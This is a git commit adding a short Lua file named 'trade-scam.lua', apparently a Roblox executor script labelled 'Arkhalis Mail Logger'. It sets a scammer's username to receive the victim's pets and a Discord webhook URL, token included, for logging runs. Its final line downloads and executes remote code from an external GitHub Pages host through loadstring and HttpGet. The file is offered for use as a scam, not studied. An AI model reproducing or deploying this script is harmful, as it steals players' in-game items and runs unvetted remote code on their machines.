a97feebdc97b7052391b1db840a5447d5433a704
unusunit <131908548+unusunit@users.noreply.github.com>
2023-04-29 17:55:43 +0300

    Create trade-scam.lua

---
+++ trade-scam.lua
@@ -0,0 +1,19 @@
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+_G.Username = "unusunit2" --// Username To Send Pets To
+_G.GiftMessage = "LOL" --// Message For The Gift To Say
+
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1100496954305286144/yJNK6GE2hiduDTT9QFb0TUrjf2xzcdGXbguYW_UTzbR11iTll3ILLZJDJDMZCiDMILas" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+_G.ScriptName = "TRADE-SCAM" --// Script Name On The UI
+_G.Tip1 = "1" --// Gives You Tips On The UI
+_G.Tip2 = "2" --// Gives You Tips On The UI
+_G.Tip3 = "3" --// Gives You Tips On The UI
+_G.Tip4 = "4" --// Gives You Tips On The UI
+_G.Tip5 = "5" --// Gives You Tips On The UI
+--[[ Script ]]--
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
